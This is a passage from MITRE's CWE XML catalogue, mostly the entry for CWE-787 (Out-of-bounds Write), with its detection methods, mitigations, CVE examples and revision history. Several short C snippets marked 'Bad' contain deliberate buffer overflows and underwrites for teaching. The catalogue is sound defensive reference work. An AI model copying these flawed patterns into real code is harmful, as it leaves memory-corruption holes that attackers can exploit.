					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Description, Maintenance_Notes, Potential_Mitigations, Relationship_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, References</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Detection_Factors</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="787" Name="Out-of-bounds Write" Abstraction="Base" Structure="Simple" Status="Draft">
         <ns0:Description>The product writes data past the end, or before the beginning, of the intended buffer.</ns0:Description>
         <ns0:Extended_Description>Typically, this can result in corruption of data, a crash, or code execution.  The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.  A subsequent write operation then produces undefined or unexpected results.</ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1003" Ordinal="Primary" />
             <ns0:Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1305" Ordinal="Primary" />
			 <ns0:Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1340" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Name="C" Prevalence="Often" />
            <ns0:Language Name="C++" Prevalence="Often" />
            <ns0:Language Class="Assembly" Prevalence="Undetermined" />
            <ns0:Technology Class="ICS/OT" Prevalence="Often" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>Memory Corruption</ns0:Term>
               <ns0:Description>Often used to describe the consequences of writing to memory outside the bounds of a buffer, or to memory that is invalid, when the root cause is something other than a sequential copy of excessive data from a fixed starting location. This may include issues such as incorrect pointer arithmetic, accessing invalid pointers due to incomplete initialization or memory release, etc.</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-1">
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</html:p>
                  <html:p>Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>Detection techniques for buffer-related errors are more mature than for most other weakness types.</ns0:Effectiveness_Notes>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-2">
               <ns0:Method>Automated Dynamic Analysis</ns0:Method>
               <ns0:Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</ns0:Description>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation Mitigation_ID="MIT-3">
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Strategy>Language Selection</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</html:p>
                  <html:p>For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.</html:p>
                  <html:p>Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-4.1">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Libraries or Frameworks</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</html:p>
                  <html:p>Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.</html:p>
               </ns0:Description>
               <ns0:Effectiveness_Notes>This is not a complete solution, since many buffer overflows are not related to strings.</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-10">
              <ns0:Phase>Operation</ns0:Phase> 
	      <ns0:Phase>Build and Compilation</ns0:Phase>
	      <ns0:Strategy>Environment Hardening</ns0:Strategy> 
	      <ns0:Description> 
		<html:p>Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. </html:p> 
		<html:p> D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. </html:p> 

	      </ns0:Description> 
	      <ns0:Effectiveness>Defense in Depth</ns0:Effectiveness> 
	      <ns0:Effectiveness_Notes> 
		<html:p> This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. </html:p> 
	      </ns0:Effectiveness_Notes>
	    </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-9">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>
                  <html:p>Consider adhering to the following rules when allocating and managing an application's memory:</html:p>
                     <html:ul>
                        <html:li>Double check that the buffer is as large as specified.</html:li>
                        <html:li>When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.</html:li>
                        <html:li>Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.</html:li>
                        <html:li>If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.</html:li>
                     </html:ul>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-11">
               <ns0:Phase>Operation</ns0:Phase> 
	       <ns0:Phase>Build and Compilation</ns0:Phase> 
	       <ns0:Strategy>Environment Hardening</ns0:Strategy> 
	       <ns0:Description>
		 <html:p>Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. </html:p> 
		 <html:p> Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as "rebasing" (for Windows) and "prelinking" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. </html:p> 
		 <html:p> For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. </html:p>
	       </ns0:Description> 
	       <ns0:Effectiveness>Defense in Depth</ns0:Effectiveness> 
	       <ns0:Effectiveness_Notes>These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]</ns0:Effectiveness_Notes> 
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-12">
               <ns0:Phase>Operation</ns0:Phase> 
	       <ns0:Strategy>Environment Hardening</ns0:Strategy> 
	       <ns0:Description> 
		 <html:p> Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.  </html:p> 
	         <html:p> For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. </html:p>
	       </ns0:Description> 
	       <ns0:Effectiveness>Defense in Depth</ns0:Effectiveness> 
	       <ns0:Effectiveness_Notes>This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application. </ns0:Effectiveness_Notes> 
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-13">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following code attempts to save four different identification numbers into an array.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int id_sequence[3];<html:br />
                     <html:br />/* Populate the id array. */<html:br />
                     <html:br />id_sequence[0] = 123;<html:br />id_sequence[1] = 234;<html:br />id_sequence[2] = 345;<html:br />id_sequence[3] = 456;</html:div>
               </ns0:Example_Code>
	       <ns0:Body_Text>Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-114">
               <ns0:Intro_Text>In the following code, it is possible to request that memcpy move a much larger segment of memory than assumed:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int returnChunkSize(void *) {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>/* if chunk info is valid, return the size of usable memory,</html:i>
                           <html:br />
                           <html:br />
                           <html:i>* else, return -1 to indicate an error</html:i>
                           <html:br />
                           <html:br />
                           <html:i>*/</html:i>
                           <html:br />...</html:div>
                     </html:div>}<html:br />int main() {<html:div style="margin-left:1em;">...<html:br />memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));<html:br />...</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788).</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <ns0:Intro_Text>This code takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>void host_lookup(char *user_supplied_addr){<html:div style="margin-left:1em;">
                        <html:div>struct hostent *hp;<html:br />in_addr_t *addr;<html:br />char hostname[64];<html:br />in_addr_t inet_addr(const char *cp);<html:br />
                           <html:br />
                           <html:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</html:i>
                           <html:br />
                           <html:br />validate_addr_form(user_supplied_addr);<html:br />addr = inet_addr(user_supplied_addr);<html:br />hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<html:br />strcpy(hostname, hp-&gt;h_name);</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.</ns0:Body_Text>
               <ns0:Body_Text>Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-19">
               <ns0:Intro_Text>This code applies an encoding procedure to an input string and stores it into a buffer.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>char * copy_input(char *user_supplied_string){<html:div style="margin-left:1em;">
                        <html:div>int i, dst_index;<html:br />char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<html:br />if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<html:div style="margin-left:1em;">die("user string too long, die evil hacker!");</html:div>}<html:br />dst_index = 0;<html:br />for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<html:div style="margin-left:1em;">
                              <html:div>if( '&amp;' == user_supplied_string[i] ){<html:div style="margin-left:1em;">dst_buf[dst_index++] = '&amp;';<html:br />dst_buf[dst_index++] = 'a';<html:br />dst_buf[dst_index++] = 'm';<html:br />dst_buf[dst_index++] = 'p';<html:br />dst_buf[dst_index++] = ';';</html:div>}<html:br />else if ('&lt;' == user_supplied_string[i] ){<html:div style="margin-left:1em;">
                                    <html:div>
                                       <html:br />
                                       <html:i>/* encode to &amp;lt; */</html:i>
                                       <html:br />
                                    </html:div>
                                 </html:div>}<html:br />else dst_buf[dst_index++] = user_supplied_string[i];</html:div>
                           </html:div>}<html:br />return dst_buf;</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string. However, the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-87">
               <ns0:Intro_Text>In the following C/C++ code, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>char* trimTrailingWhitespace(char *strMessage, int length) {<html:div style="margin-left:1em;">
                        <html:div>char *retMessage;<html:br />char *message = malloc(sizeof(char)*(length+1));<html:br />
                           <html:br />
                           <html:i>// copy input string to a temporary string</html:i>
                           <html:br />char message[length+1];<html:br />int index;<html:br />for (index = 0; index &lt; length; index++) {<html:div style="margin-left:1em;">message[index] = strMessage[index];</html:div>}<html:br />message[index] = '\0';<html:br />
                           <html:br />
                           <html:i>// trim trailing whitespace</html:i>
                           <html:br />int len = index-1;<html:br />while (isspace(message[len])) {<html:div style="margin-left:1em;">message[len] = '\0';<html:br />len--;</html:div>}<html:br />
                           <html:br />
                           <html:i>// return string without trailing whitespace</html:i>
                           <html:br />retMessage = message;<html:br />return retMessage;</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-20">
               <ns0:Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int i;<html:br />unsigned int numWidgets;<html:br />Widget **WidgetList;<html:br />
                     <html:br />numWidgets = GetUntrustedSizeValue();<html:br />if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS)) {<html:div style="margin-left:1em;">ExitError("Incorrect number of widgets requested!");</html:div>}<html:br />WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));<html:br />printf("WidgetList ptr=%p\n", WidgetList);<html:br />for(i=0; i&lt;numWidgets; i++) {<html:div style="margin-left:1em;">WidgetList[i] = InitializeWidget();</html:div>}<html:br />WidgetList[numWidgets] = NULL;<html:br />showWidgets(WidgetList);</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-88">
               <ns0:Intro_Text>The following code may result in a buffer underwrite, if find() returns a negative value to indicate that ch is not found in srcBuf:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int main() {<html:div style="margin-left:1em;">...<html:br />strncpy(destBuf, &amp;srcBuf[find(srcBuf, ch)], 1024);<html:br />...</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If the index to srcBuf is somehow under user control, this is an arbitrary write-what-where condition.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-21220</ns0:Reference>
               <ns0:Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-28664</ns0:Reference>
               <ns0:Description>GPU kernel driver allows memory corruption because a user can obtain read/write access to read-only pages, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-28664</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-17087</ns0:Reference>
               <ns0:Description>Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-17087</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-1054</ns0:Reference>
               <ns0:Description>Out-of-bounds write in kernel-mode driver, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-1054</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-0041</ns0:Reference>
               <ns0:Description>Escape from browser sandbox using out-of-bounds write due to incorrect bounds check, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-0041</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-0968</ns0:Reference>
               <ns0:Description>Memory corruption in web browser scripting engine, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-0968</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-0022</ns0:Reference>
               <ns0:Description>chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-0022</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2019-1010006</ns0:Reference>
               <ns0:Description>Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2019-1010006</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1532</ns0:Reference>
               <ns0:Description>malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1532</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-0269</ns0:Reference>
               <ns0:Description>chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-0269</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-2227</ns0:Reference>
               <ns0:Description>Unchecked length of SSLv2 challenge value leads to buffer underflow.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-2227</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-4580</ns0:Reference>
               <ns0:Description>Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-4580</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-4268</ns0:Reference>
               <ns0:Description>Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-4268</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2550</ns0:Reference>
               <ns0:Description>Classic stack-based buffer overflow in media player using a long entry in a playlist</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2550</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2403</ns0:Reference>
               <ns0:Description>Heap-based buffer overflow in media player using a long entry in a playlist</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2403</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
	 <ns0:Taxonomy_Mappings>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
	     <ns0:Entry_Name>Req SR 3.5</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	     <ns0:Entry_Name>Req SI-1</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	     <ns0:Entry_Name>Req SI-2</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	     <ns0:Entry_Name>Req SVV-1</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	     <ns0:Entry_Name>Req SVV-3</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	   <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
	     <ns0:Entry_Name>Req CR 3.5</ns0:Entry_Name>
	   </ns0:Taxonomy_Mapping>
	 </ns0:Taxonomy_Mappings>
         <ns0:References>
	    <ns0:Reference External_Reference_ID="REF-1029" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 5, &quot;Stack Overruns&quot; Page 129" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 5, &quot;Heap Overruns&quot; Page 138" />
            <ns0:Reference External_Reference_ID="REF-44" Section="&quot;Sin 5: Buffer Overruns.&quot; Page 89" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 3, &quot;Nonexecutable Stack&quot;, Page 76" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 5, &quot;Protection Mechanisms&quot;, Page 189" />
            <ns0:Reference External_Reference_ID="REF-90" />
            <ns0:Reference External_Reference_ID="REF-56" />
            <ns0:Reference External_Reference_ID="REF-57" />
            <ns0:Reference External_Reference_ID="REF-58" />
            <ns0:Reference External_Reference_ID="REF-60" />
            <ns0:Reference External_Reference_ID="REF-61" />
            <ns0:Reference External_Reference_ID="REF-64" />
	    <ns0:Reference External_Reference_ID="REF-1332" />
	    <ns0:Reference External_Reference_ID="REF-1333" />
	    <ns0:Reference External_Reference_ID="REF-1334" />
	    <ns0:Reference External_Reference_ID="REF-1335" />
	    <ns0:Reference External_Reference_ID="REF-1336" />
	    <ns0:Reference External_Reference_ID="REF-1337" Section="Memory information leaks" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CWE Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>MITRE</ns0:Submission_Organization>
               <ns0:Submission_Date>2009-10-21</ns0:Submission_Date>
               <ns0:Submission_Version>1.6</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2009-10-29</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
